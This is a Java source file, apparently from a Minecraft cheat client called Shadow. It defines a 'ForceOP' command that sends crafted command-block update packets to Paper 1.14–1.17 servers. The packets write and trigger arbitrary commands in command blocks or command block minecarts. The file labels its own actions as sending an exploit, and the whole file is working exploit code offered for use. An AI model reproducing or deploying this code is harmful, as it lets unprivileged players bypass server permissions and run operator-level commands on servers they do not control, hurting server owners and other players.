/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.minecraft.block.Block;
import net.minecraft.block.BlockState;
import net.minecraft.block.Blocks;
import net.minecraft.block.entity.CommandBlockBlockEntity;
import net.minecraft.entity.vehicle.CommandBlockMinecartEntity;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockMinecartC2SPacket;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.hit.HitResult;
import net.minecraft.util.math.BlockPos;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import net.shadow.client.feature.command.exception.CommandException;

public class ForceOP extends Command {
    public ForceOP() {
        super("ForceOP", "Edit command blocks on paper 1.14 - 1.17", "forceop", "editcmd");
    }

    @Override
    public ExamplesEntry getExampleArguments() {
        return new ExamplesEntry("say hello", "tp @e 0 0 0");
    }

    @Override
    public void onExecute(String[] args) throws CommandException {
        validateArgumentsLength(args, 1, "Provide command");
        HitResult view = ShadowMain.client.crosshairTarget;
        String command = String.join(" ", args);
        if (view == null || view.getType() == HitResult.Type.MISS) {
            error("Look at a command block or command block minecart");
        } else if (view instanceof EntityHitResult ehr) {
            if (ehr.getEntity() instanceof CommandBlockMinecartEntity) {
                message("Sending exploit");
                ShadowMain.client.player.networkHandler.sendPacket(new UpdateCommandBlockMinecartC2SPacket(ehr.getEntity().getId(), command, false));
                success("Sent exploit, try to activate the command block minecart");
            } else {
                error("Look at a command block minecart");
            }
        } else if (view instanceof BlockHitResult bhr) {
            BlockPos bp = bhr.getBlockPos();
            BlockState bs = ShadowMain.client.world.getBlockState(bp);
            Block b = bs.getBlock();
            if (b == Blocks.COMMAND_BLOCK || b == Blocks.REPEATING_COMMAND_BLOCK || b == Blocks.CHAIN_COMMAND_BLOCK) {
                message("Sending exploit");
                ShadowMain.client.getNetworkHandler().sendPacket(new UpdateCommandBlockC2SPacket(bp, "", CommandBlockBlockEntity.Type.REDSTONE, false, false, false));
                ShadowMain.client.getNetworkHandler().sendPacket(new UpdateCommandBlockC2SPacket(bp, command, CommandBlockBlockEntity.Type.REDSTONE, false, false, true));
                success("Sent exploit, command block should self activate");
            } else {
                error("Look at any type of command block");
            }
        }

    }
}
